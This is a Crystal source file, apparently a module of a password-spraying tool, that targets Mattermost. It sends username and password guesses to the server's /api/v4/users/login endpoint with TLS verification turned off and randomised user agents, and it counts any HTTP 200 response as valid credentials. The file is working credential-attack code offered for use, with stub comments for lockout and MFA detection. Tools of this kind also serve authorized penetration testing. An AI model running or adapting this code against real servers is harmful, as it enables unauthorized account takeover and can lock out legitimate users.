require "http/client"

class Mattermost < Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) : SprayStatus
        spstatus = SprayStatus.new()
        spstatus.username = username 
        spstatus.password = password 

        # some basic setups for web based auth 
        url = URI.parse @target 
        #gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        # create a http client 
        client = HTTP::Client.new(url, tls: context)
        # and some basic header options
        header = HTTP::Headers{ # basic template for headers for post/get request 
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))], # uses a random header theres only 1 by default 
            "Accept" => "*/*",
            "Accept-Language" => "en",
            "Accept-Encoding" => "gzip, deflate",
            "Content-Type" => "text/plain;charset=UTF-8",
            "Origin" => "https://#{url.host}",
            "Referer" => "https://#{url.host}#{url.path}"
        } 

        
        form = {
            "device_id" => "",
            "login_id" => username,
            "password"=> password,
            "token" => ""
        }.to_json 
        
        # here is the basic request 
        page = client.post(url.path + "/api/v4/users/login", headers: header, body: form) # client supporst all http verbs as client.verb -> client.get, client.delete..etc 

        #
        # logic for if valid login goes here replace whats here. it only serves as a guide for quick editing 
        # 
        # 
        # these are EXAMPLES of how to do checks 
        if page.status_code == 200 # if ok 
            spstatus.valid_credentials = true 
        end

        # if page.body.includes? "redircting to mfa"
        #     spstatus.mfa = true 
        # end

        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        # return the SprayStatus object 
        return spstatus
    end
end